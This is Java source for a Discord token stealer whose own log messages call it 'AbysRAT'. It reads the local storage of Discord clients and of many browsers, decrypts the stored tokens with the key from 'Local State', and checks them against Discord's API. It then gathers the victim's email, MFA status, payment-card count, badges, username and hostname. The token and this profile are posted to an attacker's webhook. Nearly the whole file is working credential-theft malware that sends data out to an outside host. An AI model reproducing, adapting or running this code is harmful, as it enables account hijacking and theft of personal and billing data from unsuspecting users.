package dev.nfo.handlers;

import dev.nfo.utils.Utils;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.Base64;

public class Discord {
    private static File appData = new File(System.getenv("APPDATA"));
    private static File localAppData = new File(System.getenv("LOCALAPPDATA"));
    private static Pattern tokenRegex = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}");
    private static Pattern encTokenRegex = Pattern.compile("dQw4w9WgXcQ:[^\"]*");
    private static HashMap<String, String> paths = new HashMap<String, String>() {{
        put("Discord", appData + "\\discord\\Local Storage\\leveldb");
        put("Discord Canary", appData + "\\discordcanary\\Local Storage\\leveldb");
        put("Discord PTB", appData + "\\discordptb\\Local Storage\\leveldb");
        put("Lightcord", appData + "\\Lightcord\\Local Storage\\leveldb");
        put("Opera", appData + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb");
        put("Opera GX", appData + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb");
        put("Amigo", localAppData + "\\Amigo\\User Data\\Local Storage\\leveldb");
        put("Torch", localAppData + "\\Torch\\User Data\\Local Storage\\leveldb");
        put("Kometa", localAppData + "\\Kometa\\User Data\\Local Storage\\leveldb");
        put("Orbitum", localAppData + "\\Orbitum\\User Data\\Local Storage\\leveldb");
        put("CentBrowser", localAppData + "\\CentBrowser\\User Data\\Local Storage\\leveldb");
        put("7Star", localAppData + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb");
        put("Sputnik", localAppData + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb");
        put("Vivaldi", localAppData + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb");
        put("Chrome SxS", localAppData + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb");
        put("Chrome", localAppData + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
        put("Chrome1", localAppData + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb");
        put("Chrome2", localAppData + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb");
        put("Chrome3", localAppData + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb");
        put("Chrome4", localAppData + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb");
        put("Chrome5", localAppData + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb");
        put("Epic Privacy Browser", localAppData + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb");
        put("Microsoft Edge", localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb");
        put("Uran", localAppData + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb");
        put("Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb");
        put("Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");
        put("Iridium", localAppData + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb");
    }};
    
    private Vector<String> tokens = new Vector<String>();
    private String webhookUrl;

    public Discord(String webhookUrl) {
        this.webhookUrl = webhookUrl;
    }

    public void sendTokens() {
        try {
            crawl();
            validateTokens();
            for (String token : tokens) {
                try {
                    sendTokenEmbed(token);
                } catch (Exception e) {
                    // Ignore individual token errors
                }
            }
        } catch (Exception e) {
            // Ignore to prevent crashes
        }
    }

    private void crawl() {
        for (String key : paths.keySet()) {
            try {
                File path = new File(paths.get(key));
                if (!path.exists()) continue;
                System.out.println("[AbysRAT] Verificando: " + key);
                if (key.contains("iscord")) {
                    crawlEncrypted(path);
                    // Para Discord, também procurar tokens não criptografados (raros mas possíveis)
                    crawlUnencrypted(path);
                }
                // Não procurar tokens em navegadores - eles não têm tokens Discord válidos
            } catch (Exception e) {
                System.out.println("[AbysRAT] Erro ao verificar " + key + ": " + e.getMessage());
            }
        }
    }

    private void crawlEncrypted(File path) {
        try {
            File localState = new File(path.getParentFile().getParentFile(), "Local State");
            System.out.println("[AbysRAT] Tentando descriptografar tokens de: " + path.getAbsolutePath());
            if (!localState.exists()) {
                System.out.println("[AbysRAT] Local State não encontrado: " + localState.getAbsolutePath());
                return;
            }
            
            System.out.println("[AbysRAT] Obtendo chave do Local State...");
            byte[] key = Utils.getKey(localState);
            if (key == null || key.length == 0) {
                System.out.println("[AbysRAT] Falha ao obter chave");
                return;
            }
            System.out.println("[AbysRAT] Chave obtida com sucesso! Tamanho: " + key.length + " bytes");
            
            File[] files = path.listFiles();
            if (files == null) {
                System.out.println("[AbysRAT] Nenhum arquivo encontrado no diretório");
                return;
            }
            
            int foundEncrypted = 0;
            for (File file : files) {
                if (!file.getName().endsWith(".log") && !file.getName().endsWith(".ldb")) continue;
                Vector<String> encTokens = regexFile(encTokenRegex, file);
                if (encTokens.size() > 0) {
                    System.out.println("[AbysRAT] Arquivo " + file.getName() + ": " + encTokens.size() + " token(s) criptografado(s) encontrado(s)");
                }
                for (String encToken : encTokens) {
                    try {
                        System.out.println("[AbysRAT] Tentando descriptografar token...");
                        String base64Token = encToken.replace("dQw4w9WgXcQ:", "");
                        byte[] encryptedBytes = Base64.getDecoder().decode(base64Token.getBytes());
                        String token = Utils.decrypt(encryptedBytes, key);
                        if (token == null) continue;
                        if (token != null && !token.isEmpty() && !tokens.contains(token)) {
                            tokens.add(token);
                            foundEncrypted++;
                            System.out.println("[AbysRAT] Token criptografado descriptografado com sucesso!");
                        }
                    } catch (Exception e) {
                        System.out.println("[AbysRAT] Erro ao descriptografar token: " + e.getMessage());
                    }
                }
            }
            System.out.println("[AbysRAT] Total de tokens criptografados descriptografados: " + foundEncrypted);
        } catch (Exception e) {
            System.out.println("[AbysRAT] Erro no crawlEncrypted: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void crawlUnencrypted(File path) {
        try {
            File[] files = path.listFiles();
            if (files == null) return;
            for (File file : files) {
                try {
                    Vector<String> foundTokens = regexFile(tokenRegex, file);
                    for (String token : foundTokens) {
                        if (!tokens.contains(token)) {
                            tokens.add(token);
                            System.out.println("[AbysRAT] Token não criptografado encontrado!");
                        }
                    }
                } catch (Exception e) {
                }
            }
        } catch (Exception e) {
        }
    }

    private Vector<String> regexFile(Pattern pattern, File file) {
        Vector<String> result = new Vector<String>();
        try {
            BufferedReader reader = new BufferedReader(new FileReader(file));
            StringBuilder content = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line);
            }
            reader.close();
            Matcher matcher = pattern.matcher(content.toString());
            while (matcher.find()) {
                String match = matcher.group();
                if (!result.contains(match)) {
                    result.add(match);
                }
            }
        } catch (Exception e) {
        }
        return result;
    }

    private void validateTokens() {
        Iterator<String> iterator = tokens.iterator();
        int validated = 0;
        while (iterator.hasNext()) {
            String token = iterator.next();
            try {
                System.out.println("[AbysRAT] Validando token: " + token.substring(0, Math.min(20, token.length())) + "...");
                URL url = new URL("https://discord.com/api/v9/users/@me");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");
                connection.setRequestProperty("Authorization", token);
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
                connection.setConnectTimeout(5000);
                connection.setReadTimeout(5000);
                
                int responseCode = connection.getResponseCode();
                System.out.println("[AbysRAT] Resposta da API de validação: " + responseCode);
                connection.disconnect();
                if (responseCode != 200) {
                    System.out.println("[AbysRAT] Token inválido (código: " + responseCode + "), removendo...");
                    iterator.remove();
                } else {
                    validated++;
                    System.out.println("[AbysRAT] Token válido!");
                }
            } catch (Exception e) {
                System.out.println("[AbysRAT] Erro ao validar token: " + e.getMessage());
                iterator.remove();
            }
        }
        System.out.println("[AbysRAT] Tokens validados com sucesso: " + validated);
    }

    private void sendTokenEmbed(String token) {
        try {
            String userData = getUserData(token);
            if (userData == null) return;
            
            String userId = extractJsonValue(userData, "id");
            String username = extractJsonValue(userData, "username");
            String email = extractJsonValue(userData, "email");
            String mfaEnabled = extractJsonValue(userData, "mfa_enabled");
            String discriminator = extractJsonValue(userData, "discriminator");
            String avatar = extractJsonValue(userData, "avatar");
            
            String badges = getBadges(userId, token);
            String billing = getBilling(token);
            String accountAge = getAccountAge(userId);
            String pcUsername = System.getProperty("user.name");
            String hostname = java.net.InetAddress.getLocalHost().getHostName();
            
            String avatarUrl = (avatar != null && !avatar.equals("null")) 
                ? "https://cdn.discordapp.com/avatars/" + userId + "/" + avatar + ".png?size=256"
                : "https://cdn.discordapp.com/embed/avatars/" + (Integer.parseInt(discriminator) % 5) + ".png";
            
            String embedJson = buildEmbedJson(pcUsername, hostname, accountAge, avatarUrl, username, badges, billing, email, mfaEnabled, token);
            
            sendWebhook(embedJson);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String getUserData(String token) {
        try {
            System.out.println("[AbysRAT] Fazendo request para /v9/users/@me...");
            URL url = new URL("https://discord.com/api/v9/users/@me");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("Authorization", token);
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);
            
            int responseCode = connection.getResponseCode();
            System.out.println("[AbysRAT] Resposta /v9/users/@me: " + responseCode);
            if (responseCode != 200) {
                connection.disconnect();
                return null;
            }
            
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();
            connection.disconnect();
            System.out.println("[AbysRAT] Dados do usuário obtidos com sucesso");
            return response.toString();
        } catch (Exception e) {
            System.out.println("[AbysRAT] Erro ao obter dados do usuário: " + e.getMessage());
            return null;
        }
    }

    private String getBadges(String userId, String token) {
        try {
            URL url = new URL("https://discord.com/api/v10/users/" + userId + "/profile");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestProperty("Authorization", token);
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            
            int responseCode = connection.getResponseCode();
            if (responseCode != 200) return "`No Badges`";
            
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();
            connection.disconnect();
            
            String profileData = response.toString();
            if (!profileData.contains("\"badges\"")) return "`No Badges`";
            
            // Parse badges and build emoji string (includes nitro badge)
            String badgesStr = parseBadges(profileData);
            return badgesStr.isEmpty() ? "`No Badges`" : badgesStr;
        } catch (Exception e) {
            return "`No Badges`";
        }
    }

    private String parseBadges(String profileData) {
        // Badge emoji map
        HashMap<String, String> badgeEmojis = new HashMap<String, String>() {{
            put("staff", "<:discordmod:1433560291559608460>");
            put("active_developer", "<:activedeveloper:1433560289025986743>");
            put("early_supporter", "<:earlysupporter:1433560286199156916>");
            put("verified_developer", "<:discordbotdev:1433560283816923197>");
            put("certified_moderator", "<:discordmod:1433560291559608460>");
            put("bug_hunter_level_1", "<:bughunter1:1433560275222794281>");
            put("bug_hunter_level_2", "<:bughunter2:1433560272093712598>");
            put("partner", "<:partner:1433560269589844079>");
            put("hypesquad_house_1", "<:hypesquadbalance:1433560268063113410>");
            put("hypesquad_house_2", "<:hypesquadbravery:1433560265663713310>");
            put("hypesquad_house_3", "<:hypesquadbrilliance:1433560262958383114>");
            put("hypesquad", "<:hypesquadevents:1433560260202729582>");
            put("nitro", "<:discordnitro:1433561619304026112>");
            put("nitro_bronze", "<:discordnitrobronze:1433561617408327752>");
            put("nitro_silver", "<:discordnitrosilver:1433561614619115520>");
            put("nitro_gold", "<:discordnitrogold:1433561612165320787>");
            put("nitro_platinum", "<:discordnitroplatinum:1433561610651172994>");
            put("nitro_diamond", "<:discordnitrodiamond:1433561608587706501>");
            put("nitro_emerald", "<:discordnitroemerald:1433561605819601057>");
            put("nitro_ruby", "<:discordnitroruby:1433561602635862016>");
            put("nitro_opal", "<:discordnitroopal:1433561599914020975>");
            put("guild_booster_lvl1", "<:discordboost1:1433563003776929862>");
            put("guild_booster_lvl2", "<:discordboost2:1433563195695431690>");
            put("guild_booster_lvl3", "<:discordboost3:1433563001344229508>");
            put("guild_booster_lvl4", "<:discordboost4:1433562999192420462>");
            put("guild_booster_lvl5", "<:discordboost5:1433562997112176711>");
            put("guild_booster_lvl6", "<:discordboost6:1433562994746327221>");
            put("guild_booster_lvl7", "<:discordboost7:1433562990421999818>");
            put("guild_booster_lvl8", "<:discordboost8:1433562987406295101>");
            put("guild_booster_lvl9", "<:discordboost9:1433562983996588143>");
            put("quest_completed", "<:quest:1433560258462220488>");
        }};
        
        // Parse badges array from JSON
        Vector<String> badgeIds = new Vector<String>();
        try {
            // Extract badges array
            int badgesStart = profileData.indexOf("\"badges\":[");
            if (badgesStart != -1) {
                int badgesEnd = profileData.indexOf("]", badgesStart);
                if (badgesEnd != -1) {
                    String badgesArray = profileData.substring(badgesStart + 9, badgesEnd + 1);
                    // Extract badge IDs
                    Pattern idPattern = Pattern.compile("\"id\"\\s*:\\s*\"([^\"]+)\"");
                    Matcher idMatcher = idPattern.matcher(badgesArray);
                    while (idMatcher.find()) {
                        String badgeId = idMatcher.group(1);
                        if (!badgeIds.contains(badgeId)) {
                            badgeIds.add(badgeId);
                        }
                    }
                }
            }
        } catch (Exception e) {
            // Ignore parsing errors
        }
        
        // Get premium_since and calculate nitro badge
        String premiumSince = extractJsonValue(profileData, "premium_since");
        String nitroBadge = getCurrentNitro(premiumSince);
        if (nitroBadge != null && !nitroBadge.isEmpty()) {
            // Add nitro badge at the beginning (like base.js does with unshift)
            badgeIds.insertElementAt(nitroBadge, 0);
        }
        
        // Build emoji string
        StringBuilder emojiStr = new StringBuilder();
        for (String badgeId : badgeIds) {
            String emoji = badgeEmojis.get(badgeId);
            if (emoji != null) {
                emojiStr.append(emoji);
            }
        }
        
        return emojiStr.toString();
    }
    
    private String getCurrentNitro(String premiumSince) {
        if (premiumSince == null || premiumSince.equals("null") || premiumSince.isEmpty()) {
            return null;
        }
        
        try {
            // Parse ISO date string (e.g., "2024-01-15T00:00:00.000Z")
            java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'");
            sdf.setTimeZone(java.util.TimeZone.getTimeZone("UTC"));
            java.util.Date sinceDate = sdf.parse(premiumSince);
            java.util.Date currentDate = new java.util.Date();
            
            // Calculate months difference using Calendar
            java.util.Calendar sinceCal = java.util.Calendar.getInstance();
            sinceCal.setTime(sinceDate);
            java.util.Calendar currentCal = java.util.Calendar.getInstance();
            currentCal.setTime(currentDate);
            
            int yearDiff = currentCal.get(java.util.Calendar.YEAR) - sinceCal.get(java.util.Calendar.YEAR);
            int monthDiff = currentCal.get(java.util.Calendar.MONTH) - sinceCal.get(java.util.Calendar.MONTH);
            int passedMonths = yearDiff * 12 + monthDiff;
            
            if (currentCal.get(java.util.Calendar.DAY_OF_MONTH) < sinceCal.get(java.util.Calendar.DAY_OF_MONTH)) {
                passedMonths -= 1;
            }
            
            // Determine nitro badge based on months (matching base.js logic)
            if (passedMonths == 0) {
                return "nitro";
            } else if (passedMonths >= 1 && passedMonths <= 2) {
                return "nitro_bronze";
            } else if (passedMonths >= 3 && passedMonths <= 5) {
                return "nitro_silver";
            } else if (passedMonths >= 6 && passedMonths <= 11) {
                return "nitro_gold";
            } else if (passedMonths >= 12 && passedMonths <= 23) {
                return "nitro_platinum";
            } else if (passedMonths >= 24 && passedMonths <= 35) {
                return "nitro_diamond";
            } else if (passedMonths >= 36 && passedMonths <= 59) {
                return "nitro_emerald";
            } else if (passedMonths >= 60 && passedMonths <= 71) {
                return "nitro_ruby";
            } else if (passedMonths >= 72) {
                return "nitro_opal";
            }
        } catch (Exception e) {
            // If parsing fails, return null
        }
        
        return null;
    }

    private String getBilling(String token) {
        try {
            URL url = new URL("https://discord.com/api/v9/users/@me/billing/payment-sources");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("Authorization", token);
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);
            
            int responseCode = connection.getResponseCode();
            if (responseCode != 200) {
                connection.disconnect();
                return "`0 Cards`";
            }
            
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();
            connection.disconnect();
            
            String billingData = response.toString();
            if (billingData.equals("[]") || billingData.trim().isEmpty()) return "`0 Cards`";
            
            // Count cards (simple count of objects)
            int count = billingData.split("\\{").length - 1;
            return "`" + count + " Cards`";
        } catch (Exception e) {
            return "`0 Cards`";
        }
    }

    private String getAccountAge(String userId) {
        try {
            long snowflake = Long.parseLong(userId);
            long timestamp = (snowflake >> 22) + 1420070400000L;
            // Convert to seconds (Discord timestamp format: <t:timestampSeconds:d>)
            long timestampSeconds = timestamp / 1000;
            return "<t:" + timestampSeconds + ":d>";
        } catch (Exception e) {
            return "Unknown";
        }
    }

    private String extractJsonValue(String json, String key) {
        try {
            Pattern pattern = Pattern.compile("\"" + key + "\"\\s*:\\s*\"([^\"]+)\"");
            Matcher matcher = pattern.matcher(json);
            if (matcher.find()) {
                return matcher.group(1);
            }
            // Try boolean/number
            pattern = Pattern.compile("\"" + key + "\"\\s*:\\s*(true|false|\\d+)");
            matcher = pattern.matcher(json);
            if (matcher.find()) {
                return matcher.group(1);
            }
        } catch (Exception e) {
            // Ignore
        }
        return null;
    }

    private String buildEmbedJson(String pcUsername, String hostname, String accountAge, String avatarUrl, 
                                   String username, String badges, String billing, String email, 
                                   String mfaEnabled, String token) {
        int color = new Random().nextInt(0xFFFFFF);
        // Use ISO 8601 format like base.js (new Date().toISOString())
        java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'");
        sdf.setTimeZone(java.util.TimeZone.getTimeZone("UTC"));
        String timestamp = sdf.format(new Date());
        
        return "{" +
            "\"username\":\"AbysRAT\"," +
            "\"avatar_url\":\"https://i.imgur.com/ovwcNwY.png\"," +
            "\"embeds\":[{" +
            "\"title\":\"" + escapeJson(pcUsername + " (" + hostname + ")") + "\"," +
            "\"color\":" + color + "," +
            "\"description\":\"Account created in: " + accountAge + "\"," +
            "\"thumbnail\":{\"url\":\"" + avatarUrl + "\"}," +
            "\"fields\":[" +
            "{\"name\":\"Username\",\"value\":\"`" + escapeJson(username != null ? username : "Unknown") + "`\",\"inline\":true}," +
            "{\"name\":\"Badges\",\"value\":\"" + (badges != null && !badges.isEmpty() ? badges : "`None`") + "\",\"inline\":true}," +
            "{\"name\":\"Billings\",\"value\":\"" + escapeJson(billing != null ? billing : "`0 Cards`") + "\",\"inline\":true}," +
            "{\"name\":\"Email\",\"value\":\"`" + escapeJson(email != null ? email : "None") + "`\",\"inline\":false}," +
            "{\"name\":\"Security\",\"value\":\"`" + (mfaEnabled != null && mfaEnabled.equals("true") ? "Enabled" : "Disabled") + "`\",\"inline\":false}," +
            "{\"name\":\"Token\",\"value\":\"```" + escapeJson(token) + "```\",\"inline\":false}" +
            "]," +
            "\"footer\":{\"text\":\"Abys Private Edition\"}," +
            "\"timestamp\":\"" + timestamp + "\"" +
            "}]" +
            "}";
    }

    private String escapeJson(String str) {
        if (str == null) return "";
        return str.replace("\\", "\\\\")
                  .replace("\"", "\\\"")
                  .replace("\n", "\\n")
                  .replace("\r", "\\r")
                  .replace("\t", "\\t");
    }

    private void sendWebhook(String json) {
        try {
            System.out.println("[AbysRAT] Enviando embed para webhook...");
            URL url = new URL(webhookUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            connection.setRequestProperty("User-Agent", "AbysRAT/1.0");
            connection.setDoOutput(true);
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);
            
            try (OutputStream outputStream = connection.getOutputStream()) {
                byte[] jsonBytes = json.getBytes(StandardCharsets.UTF_8);
                outputStream.write(jsonBytes);
                outputStream.flush();
            }
            
            int responseCode = connection.getResponseCode();
            System.out.println("[AbysRAT] Resposta do webhook: " + responseCode);
            connection.disconnect();
            if (responseCode == 200 || responseCode == 204) {
                System.out.println("[AbysRAT] Embed enviado com sucesso!");
            } else {
                System.out.println("[AbysRAT] Erro ao enviar embed (código: " + responseCode + ")");
            }
        } catch (Exception e) {
            System.out.println("[AbysRAT] Erro ao enviar webhook: " + e.getMessage());
            e.printStackTrace();
        }
    }

}
